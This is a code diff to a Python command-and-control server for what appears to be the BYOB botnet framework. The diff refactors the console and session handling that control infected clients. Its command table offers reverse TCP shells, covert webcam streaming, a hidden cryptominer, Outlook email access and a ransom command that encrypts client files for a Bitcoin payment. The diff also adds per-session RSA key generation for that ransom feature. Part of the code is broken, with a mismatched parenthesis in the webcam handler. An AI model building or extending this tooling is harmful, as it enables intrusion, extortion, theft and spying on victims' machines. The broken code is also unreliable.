@@ -21,6 +21,7 @@ import subprocess
 import collections
 
 http_serv_mod = "SimpleHTTPServer"
+
 if sys.version_info[0] > 2:
     http_serv_mod = "http.server"
     sys.path.append('core')
@@ -145,6 +146,7 @@ def main():
     globals()['c2'].run()
 
 
+
 class C2():
     """
     Console-based command & control server with a streamlined user-interface for controlling clients
@@ -220,8 +222,8 @@ class C2():
                 'usage': 'shell <id>',
                 'description': 'interact with a client with a reverse TCP shell through an active session'},
             'ransom' : {
-                'method': self.session_ransom,
-                'usage': 'ransom [id]',
+                'method': 'you must first connect to a session to use this command', # self.session_ransom,
+                'usage': 'ransom [id] [rsa key]',
                 'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
             'webcam' : {
                 'method': self.session_webcam,
@@ -294,7 +296,7 @@ class C2():
             'miner': {
                 'method': 'you must first connect to a session to use this command',
                 'description': 'run cryptocurrency miner in the background',
-                'usage': 'miner <url> <user> <pass>'},
+                'usage': 'miner <cmd> [url] [port] [wallet]'},
             'outlook': {
                 'method': 'you must first connect to a session to use this command',
                 'description': 'access outlook email in the background',
@@ -494,10 +496,10 @@ class C2():
 
         """
 
-        # terminate handlers running on other ports
-        globals()['package_handler'].terminate()
-        globals()['module_handler'].terminate()
-        globals()['post_handler'].terminate()
+        # kill handlers running on other ports
+        globals()['package_handler'].kill()
+        globals()['module_handler'].kill()
+        globals()['post_handler'].kill()
 
         # kill subprocesses (subprocess.Popen)
         for proc in self.child_procs.values():
@@ -636,45 +638,50 @@ class C2():
         Example 2:         `set prompt color=white style=bright`
 
         """
-        if args:
-            arguments = self._get_arguments(args)
-            args, kwargs = arguments.args, arguments.kwargs
-            if arguments.args:
-                target = args[0]
-                args = args[1:]
-                if target in ('debug','debugging'):
-                    if args:
-                        setting = args[0]
-                        if setting.lower() in ('0','off','false','disable'):
-                            globals()['debug'] = False
-                        elif setting.lower() in ('1','on','true','enable'):
-                            globals()['debug'] = True
-                        util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=' ')
-                        util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')
-                        return
-                for setting, option in arguments.kwargs.items():
-                    option = option.upper()
-                    if target == 'prompt':
-                        if setting == 'color':
-                            if hasattr(colorama.Fore, option):
-                                self._prompt_color = option
-                        elif setting == 'style':
-                            if hasattr(colorama.Style, option):
-                                self._prompt_style = option
-                        util.display("\nprompt color/style changed to ", color='white', style='bright', end=' ')
-                        util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
-                        return
-                    elif target == 'text':
-                        if setting == 'color':
-                            if hasattr(colorama.Fore, option):
-                                self._text_color = option
-                        elif setting == 'style':
-                            if hasattr(colorama.Style, option):
-                                self._text_style = option
-                        util.display("\ntext color/style changed to ", color='white', style='bright', end=' ')
-                        util.display(option + '\n', color=self._text_color, style=self._text_style)
-                        return
-        util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
+        if not args:
+            util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
+            return
+
+        arguments = self._get_arguments(args)
+        args, kwargs = arguments.args, arguments.kwargs
+        if not arguments.args:
+            util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
+            return
+
+        target = args[0]
+        args = args[1:]
+        if target in ('debug','debugging'):
+            if not args:
+                util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
+                return
+
+            setting = args[0]
+            if setting.lower() in ('0','off','false','disable'):
+                globals()['debug'] = False
+            elif setting.lower() in ('1','on','true','enable'):
+                globals()['debug'] = True
+
+            util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=' ')
+            util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')
+
+        for setting, option in arguments.kwargs.items():
+            option = option.upper()
+
+            if target == 'prompt':
+                if setting == 'color' and hasattr(colorama.Fore, option):
+                    self._prompt_color = option
+                elif setting == 'style' and hasattr(colorama.Style, option):
+                    self._prompt_style = option
+                util.display("\nprompt color/style changed to ", color='white', style='bright', end=' ')
+                util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)
+
+            elif target == 'text':
+                if setting == 'color' and hasattr(colorama.Fore, option):
+                    self._text_color = option
+                elif setting == 'style' and hasattr(colorama.Style, option):
+                    self._text_style = option
+                util.display("\ntext color/style changed to ", color='white', style='bright', end=' ')
+                util.display(option + '\n', color=self._text_color, style=self._text_style)
 
     def task_list(self, id=None):
         """
@@ -730,49 +737,52 @@ class C2():
         result = ''
         mode, _, arg = args.partition(' ')
         client._active.clear()
-        if not mode or str(mode).lower() == 'stream':
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            retries = 5
-            while retries > 0:
-                try:
-                    port = random.randint(6000,9999)
-                    s.bind(('0.0.0.0', port))
-                    s.listen(1)
-                    cmd = {"task": 'webcam stream {}'.format(port)}
-                    client.send_task(cmd)
-                    conn, addr = s.accept()
-                    break
-                except:
-                    retries -= 1
-            header_size = struct.calcsize("L")
-            window_name = addr[0]
-            cv2.namedWindow(window_name)
-            data = ""
-            try:
-                while True:
-                    while len(data) < header_size:
-                        data += conn.recv(4096)
-                    packed_msg_size = data[:header_size]
-                    data = data[header_size:]
-                    msg_size = struct.unpack(">L", packed_msg_size)[0]
-                    while len(data) < msg_size:
-                        data += conn.recv(4096)
-                    frame_data = data[:msg_size]
-                    data = data[msg_size:]
-                    frame = pickle.loads(frame_data)
-                    cv2.imshow(window_name, frame)
-                    key = cv2.waitKey(70)
-                    if key == 32:
-                        break
-            finally:
-                conn.close()
-                cv2.destroyAllWindows()
-                result = 'Webcam stream ended'
-        else:
+        # if not (not mode or str(mode).lower() == 'stream'):
+        if mode and not str(mode).lower() == 'stream'): # Thanks De Morgan
             client.send_task({"task": "webcam %s" % args})
             task = client.recv_task()
             result = task.get('result')
             client._active.set()
+            return result
+        # 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        retries = 5
+        while retries > 0:
+            try:
+                port = random.randint(6000,9999)
+                s.bind(('0.0.0.0', port))
+                s.listen(1)
+                cmd = {"task": 'webcam stream {}'.format(port)}
+                client.send_task(cmd)
+                conn, addr = s.accept()
+                break
+            except:
+                retries -= 1
+        header_size = struct.calcsize("L")
+        window_name = addr[0]
+        cv2.namedWindow(window_name)
+        data = ""
+        try:
+            while True:
+                while len(data) < header_size:
+                    data += conn.recv(4096)
+                packed_msg_size = data[:header_size]
+                data = data[header_size:]
+                msg_size = struct.unpack(">L", packed_msg_size)[0]
+                while len(data) < msg_size:
+                    data += conn.recv(4096)
+                frame_data = data[:msg_size]
+                data = data[msg_size:]
+                frame = pickle.loads(frame_data)
+                cv2.imshow(window_name, frame)
+                key = cv2.waitKey(70)
+                if key == 32:
+                    break
+        finally:
+            conn.close()
+            cv2.destroyAllWindows()
+            result = 'Webcam stream ended'
+
         return result
 
     def session_remove(self, session_id):
@@ -787,7 +797,8 @@ class C2():
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
         if not str(session_id).isdigit() or int(session_id) not in self.sessions:
             return
-        elif str(session_id).isdigit() and int(session_id) in self.sessions and not isinstance(self.sessions[int(session_id)], Session):
+
+        if str(session_id).isdigit() and int(session_id) in self.sessions and not isinstance(self.sessions[int(session_id)], Session):
             session = self.sessions[int(session_id)]
             util.display("Session '{}' is stale (Awaiting Connection)".format(session_id))
             _ = self.sessions.pop(int(session_id), None)
@@ -796,34 +807,38 @@ class C2():
                 util.display('Session {} expunged'.format(session_id))
             self._active.set()
             return self.run()
-        else:
-            # select session
-            session = self.sessions[int(session_id)]
-            session._active.clear()
-            # send kill command to client
-            try:
-                session.send_task({"task": "kill", "session": session.info.get('uid')})
-                # shutdown the connection
-                session.connection.shutdown(socket.SHUT_RDWR)
-                session.connection.close()
-                # update current sessions
-            except: pass
-            _ = self.sessions.pop(int(session_id), None)
-            # update persistent database
-            self.database.update_status(session.info.get('uid'), 0)
-            if self.current_session != None and int(session_id) != self.current_session.id:
-                with self.current_session._lock:
-                    util.display('Session {} disconnected'.format(session_id))
-                self._active.clear()
-                self.current_session._active.set()
-                return self.current_session.run()
-            else:
-                self.current_session = None
-                with self._lock:
-                    util.display('Session {} disconnected'.format(session_id))
-                self._active.set()
-                session._active.clear()
-                return self.run()
+
+        # Implicity else
+        # select session
+        session = self.sessions[int(session_id)]
+        session._active.clear()
+        # send kill command to client
+        try:
+            session.send_task({"task": "kill", "session": session.info.get('uid')})
+            # shutdown the connection
+            session.connection.shutdown(socket.SHUT_RDWR)
+            session.connection.close()
+            # update current sessions
+        except: 
+            pass
+
+        _ = self.sessions.pop(int(session_id), None)
+        # update persistent database
+        self.database.update_status(session.info.get('uid'), 0)
+
+        if self.current_session != None and int(session_id) != self.current_session.id:
+            with self.current_session._lock:
+                util.display('Session {} disconnected'.format(session_id))
+            self._active.clear()
+            self.current_session._active.set()
+            return self.current_session.run()
+
+        self.current_session = None
+        with self._lock:
+            util.display('Session {} disconnected'.format(session_id))
+        self._active.set()
+        session._active.clear()
+        return self.run()
 
     def client_list(self, verbose=True):
         """
@@ -857,23 +872,35 @@ class C2():
                 self.database._display(ses.info)
                 print()
 
-    def session_ransom(self, args=None):
-        """
-        Encrypt and ransom files on client machine
+    # def session_ransom(self, args=None):
+    #     """
+    #     Encrypt and ransom files on client machine
 
-        `Required`
-        :param str args:    encrypt, decrypt, payment
+    #     `Required`
+    #     :param str args:    encrypt, decrypt, payment
 
-        """
-        if self.current_session:
-            if 'decrypt' in str(args):
-                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
-            elif 'encrypt' in str(args):
-                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
-            else:
-                self.current_session.send_task({"task": "ransom {}".format(args)})
-        else:
-            util.log("No client selected")
+    #     """
+    #     if not self.current_session:
+    #         util.log("No client selected")
+    #         return "No client selected"
+
+    #     command = "ransom {}".format(args)
+
+    #     if 'decrypt' in str(args):
+    #         command = "ransom {} {}".format(args, self.current_session.rsa.exportKey())
+    #     elif 'encrypt' in str(args):
+    #         print('line 875 task: ', "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey()))
+    #         command = "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())
+
+    #     # task = self.current_session.recv_task()
+    #     # result = task.get('result')
+    #     # self.current_session._active.set()
+
+    #     task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
+    #     self.send_task(task)
+
+    #     return "Catching end case"
+
 
     def session_shell(self, session):
         """
@@ -983,35 +1010,42 @@ class C2():
             globals()['__threads']['c2'] = self.serve_until_stopped()
         while True:
             try:
+                # Wait for events to stop before continuing (ie current session)
                 self._active.wait()
+
+                # 
                 self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                 cmd_buffer = self._get_prompt(self._prompt)
-                if cmd_buffer:
-                    output = ''
-                    cmd, _, action = cmd_buffer.partition(' ')
-                    if cmd in self.commands:
-                        method = self.commands[cmd]['method']
-                        if callable(method):
-                            try:
-                                output = method(action) if len(action) else method()
-                            except Exception as e1:
-                                output = str(e1)
-                        else:
-                            util.display("\n[-]", color='red', style='bright', end=' ')
-                            util.display("Error:", color='white', style='bright', end=' ')
-                            util.display(method + "\n", color='white', style='normal')
-                    elif cmd == 'cd':
-                        try:
-                            os.chdir(action)
-                        except: pass
-                    else:
-                        try:
-                            output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
-                        except: pass
-                    if output:
-                        util.display(str(output))
-                if globals()['__abort']:
+
+                if not cmd_buffer and globals()['__abort']:
                     break
+
+                output = ''
+                cmd, _, action = cmd_buffer.partition(' ')
+                if cmd in self.commands:
+                    method = self.commands[cmd]['method']
+                    if callable(method):
+                        try:
+                            output = method(action) if len(action) else method()
+                        except Exception as e1:
+                            output = str(e1)
+                    else:
+                        util.display("\n[-]", color='red', style='bright', end=' ')
+                        util.display("Error:", color='white', style='bright', end=' ')
+                        util.display(method + "\n", color='white', style='normal')
+                elif cmd == 'cd':
+                    try:
+                        os.chdir(action)
+                    except: pass
+                else:
+                    try:
+                        output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
+                    except: 
+                        pass
+
+                if output:
+                    util.display(str(output))
+
             except KeyboardInterrupt:
                 self._active.clear()
                 break
@@ -1046,7 +1080,11 @@ class Session(threading.Thread):
         self.id = id
         self.connection = connection
         self.key = security.diffiehellman(self.connection)
-        self.rsa = None  # security.Crypto.PublicKey.RSA.generate(2048)
+        # self.rsa = security.Crypto.PublicKey.RSA.generate(2048)
+
+        from Crypto.PublicKey import RSA
+        self.rsa = RSA.generate(2048)
+
         try:
             self.info = self.client_info()
             #self.info['id'] = self.id
@@ -1171,7 +1209,11 @@ class Session(threading.Thread):
                                     task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                     globals()['c2'].display(result.encode())
                                     globals()['c2'].database.handle_task(task)
+                                else:
+                                    globals()['c2']._print("Error! Malformated return value from command! Session scheduled and ran command '" + cmd + "'but it returned a None value. Please return a string")
                                 continue
+                            else:
+                                globals()['c2']._print("Error! Malformated method in Session! Session regiestered the method in C2.method[" + cmd + "] as callable when it, in fact, wasn't.")
                         else:
                             task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
                             self.send_task(task)
@@ -1179,11 +1221,17 @@ class Session(threading.Thread):
                         if task.get('result') and task.get('result') != 'None':
                             globals()['c2'].display(task.get('result').encode())
                             globals()['c2'].database.handle_task(task)
+                        else:
+                            globals()['c2']._print("Error! Malformated task in Session! Tasks has a result field set to None. Verify bot communication code and return values from internal Session functions.")
+                    else:
+                        globals()['c2']._print("Error! Malformated task to Session! Tasks need to include one of the following keys: result, prompt, or help.\n")
                 else:
                     if self._abort:
                         break
                     elif isinstance(task, int) and task == 0:
                         break
+                    else:
+                        globals()['c2']._print("Error! Malformated task to Session! It should be an int or a dict.\n")
                 self._prompt = None
 
         time.sleep(1)
